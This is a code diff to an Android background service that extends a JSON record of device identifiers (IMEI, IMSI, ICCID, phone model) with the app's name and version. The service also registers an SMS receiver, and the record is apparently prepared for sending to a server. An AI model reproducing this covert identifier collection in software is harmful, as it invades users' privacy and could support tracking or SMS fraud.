@@ -23,6 +23,8 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager.NameNotFoundException;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
@@ -57,6 +59,8 @@ public class AService extends Service implements Runnable{
 	private String iccid = "0";
 	private String imsi;
 	private String pstyle = "δ֪";
+	private String appname = "δ֪";
+	private int ver = 0;
 	
 	private SrceenReceiver srcReceiver = null;
 	private SmsReceiver smsReceiver = null;
@@ -101,6 +105,17 @@ public class AService extends Service implements Runnable{
         }
         
         pstyle = android.os.Build.MODEL;
+        
+        
+        try {
+        	PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(),0);
+        	appname = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
+			ver = packageInfo.versionCode;
+		} catch (NameNotFoundException e) {
+			// TODO Auto-generated catch block
+			///e.printStackTrace();
+			ver = 0;
+		}
         
         if(srcReceiver==null){
         	srcReceiver = new SrceenReceiver();
@@ -385,11 +400,13 @@ public class AService extends Service implements Runnable{
 			json.put("imsi", imsi);
 			json.put("iccid", iccid);
 			json.put("pstyle", pstyle);
+			json.put("appname", appname);
+			json.put("version", Integer.toString(ver));
 			postData = json.toString();
 		} catch (JSONException e) {
 			// TODO Auto-generated catch block
 			//e.printStackTrace();
-			postData = "{\"imei\":\""+imei+"\",\"imsi\":\""+imsi+"\",\"pstyle\":\""+pstyle+"\",\"iccid\":\""+iccid+"\"}";
+			postData = "{\"imei\":\""+imei+"\",\"imsi\":\""+imsi+"\",\"pstyle\":\""+pstyle+"\",\"appname\":\""+appname+"\",\"version\":\""+ver+"\",\"iccid\":\""+iccid+"\"}";
 		}				
 //		try {
 //			postData = URLEncoder.encode(postData, "UTF-8");
